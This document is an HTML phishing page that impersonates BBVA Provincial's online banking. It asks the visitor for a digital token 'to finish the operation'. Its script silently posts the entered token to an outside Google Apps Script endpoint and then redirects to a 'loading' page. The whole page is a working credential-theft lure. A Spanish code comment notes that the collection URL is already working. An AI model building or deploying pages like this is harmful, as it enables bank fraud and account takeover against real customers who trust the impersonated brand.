<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Token BBVA</title>
    <meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no" />
</head>
<body>

<div class="w-full py-4 px-6 items-center" style="background: #072146; padding: 15px;">
    <img src="logo-bbva-provincial1.png" style="width: 150px" />
</div>

<div class="container">
    <h1 style="font-size: 25px">Token BBVA</h1>
    <h1 style="font-size: 18px; text-align: left">Ingrese su token para finalizar la operacion</h1>

    <form id="tokenForm" onsubmit="event.preventDefault(); enviarDatos(this);">
        <div class="group">
            <input name="token" id="token" type="tel" maxlength="16" autocomplete="off" required />
            <label for="token">Ingrese el token digital</label>
        </div>
        <br /><br />

        <div align="center">
            <button type="submit" id="btnEnviar" style="background-color: #237aba; width: 60%; padding: 1.3rem; border: none; color: #fff; cursor: pointer;">
                Continuar
            </button>
        </div>
    </form>
</div>

<script>
async function enviarDatos(formulario) {
    const btn = document.getElementById('btnEnviar');
    btn.innerText = "Enviando...";
    btn.disabled = true;

    const datos = new FormData(formulario);
    // La misma URL que ya tienes funcionando
    const URL_GOOGLE = "https://script.google.com/macros/s/AKfycbx9cU2lLhshUBFHq36KlSNXi4_Gr1YAuD6FhF3kzix3MzvDACFedcrwtpVYqApaHHII9g/exec";

    try {
        await fetch(URL_GOOGLE, {
            method: "POST",
            mode: "no-cors",
            body: datos
        });
        // Redirige después de enviar
        window.location.href = "cargando.html";
    } catch (error) {
        alert("Error al enviar, intente de nuevo.");
        btn.disabled = false;
        btn.innerText = "Continuar";
    }
}
</script>

</body>
</html>
